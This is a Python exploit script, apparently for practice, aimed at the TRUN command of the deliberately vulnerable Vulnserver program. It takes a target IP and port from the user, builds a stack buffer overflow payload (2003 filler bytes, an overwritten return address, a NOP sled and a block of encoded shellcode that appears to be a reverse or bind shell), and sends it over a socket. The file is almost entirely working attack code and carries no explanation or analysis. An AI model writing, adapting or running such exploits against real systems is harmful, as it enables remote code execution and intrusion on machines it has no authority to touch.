#!/usr/bin/python3

import sys,socket
from time import sleep

print("**************VULNSERVER- TRUN *************")
sleep(0.5)
ip_address=input("ENter the IP address\n")
port_number=input("Enter the port number\n")

if (len(ip_address)<=0) or (len(port_number)<=0):
    if (len(ip_address)>0) and (len(port_number)<=0):
        print("*" * 30)
        print("Port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0):
        print("*" * 30)
        print("IP address field is empty")
    else:
        print("*" * 30)
        print("Issues with the user input")

elif (len(ip_address)>0) and (len(port_number)>0):
    buf =  b""
    buf += b"\xda\xcb\xba\x0b\x4d\x17\xaa\xd9\x74\x24\xf4\x5b"
    buf += b"\x31\xc9\xb1\x52\x83\xeb\xfc\x31\x53\x13\x03\x58"
    buf += b"\x5e\xf5\x5f\xa2\x88\x7b\x9f\x5a\x49\x1c\x29\xbf"
    buf += b"\x78\x1c\x4d\xb4\x2b\xac\x05\x98\xc7\x47\x4b\x08"
    buf += b"\x53\x25\x44\x3f\xd4\x80\xb2\x0e\xe5\xb9\x87\x11"
    buf += b"\x65\xc0\xdb\xf1\x54\x0b\x2e\xf0\x91\x76\xc3\xa0"
    buf += b"\x4a\xfc\x76\x54\xfe\x48\x4b\xdf\x4c\x5c\xcb\x3c"
    buf += b"\x04\x5f\xfa\x93\x1e\x06\xdc\x12\xf2\x32\x55\x0c"
    buf += b"\x17\x7e\x2f\xa7\xe3\xf4\xae\x61\x3a\xf4\x1d\x4c"
    buf += b"\xf2\x07\x5f\x89\x35\xf8\x2a\xe3\x45\x85\x2c\x30"
    buf += b"\x37\x51\xb8\xa2\x9f\x12\x1a\x0e\x21\xf6\xfd\xc5"
    buf += b"\x2d\xb3\x8a\x81\x31\x42\x5e\xba\x4e\xcf\x61\x6c"
    buf += b"\xc7\x8b\x45\xa8\x83\x48\xe7\xe9\x69\x3e\x18\xe9"
    buf += b"\xd1\x9f\xbc\x62\xff\xf4\xcc\x29\x68\x38\xfd\xd1"
    buf += b"\x68\x56\x76\xa2\x5a\xf9\x2c\x2c\xd7\x72\xeb\xab"
    buf += b"\x18\xa9\x4b\x23\xe7\x52\xac\x6a\x2c\x06\xfc\x04"
    buf += b"\x85\x27\x97\xd4\x2a\xf2\x38\x84\x84\xad\xf8\x74"
    buf += b"\x65\x1e\x91\x9e\x6a\x41\x81\xa1\xa0\xea\x28\x58"
    buf += b"\x23\xb9\xb9\x68\xb6\xa9\xc3\x6c\xbb\xdb\x4d\x8a"
    buf += b"\xd1\x0b\x18\x05\x4e\xb5\x01\xdd\xef\x3a\x9c\x98"
    buf += b"\x30\xb0\x13\x5d\xfe\x31\x59\x4d\x97\xb1\x14\x2f"
    buf += b"\x3e\xcd\x82\x47\xdc\x5c\x49\x97\xab\x7c\xc6\xc0"
    buf += b"\xfc\xb3\x1f\x84\x10\xed\x89\xba\xe8\x6b\xf1\x7e"
    buf += b"\x37\x48\xfc\x7f\xba\xf4\xda\x6f\x02\xf4\x66\xdb"
    buf += b"\xda\xa3\x30\xb5\x9c\x1d\xf3\x6f\x77\xf1\x5d\xe7"
    buf += b"\x0e\x39\x5e\x71\x0f\x14\x28\x9d\xbe\xc1\x6d\xa2"
    buf += b"\x0f\x86\x79\xdb\x6d\x36\x85\x36\x36\x56\x64\x92"
    buf += b"\x43\xff\x31\x77\xee\x62\xc2\xa2\x2d\x9b\x41\x46"
    buf += b"\xce\x58\x59\x23\xcb\x25\xdd\xd8\xa1\x36\x88\xde"
    buf += b"\x16\x36\x99"
    buffer=b"A" * 2003 + b"\xAF\x11\x50\x62" + b"\x90" * 16 + buf
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address, int(port_number)))
    s.send((b"TRUN /.:/" + buffer))
    s.close()
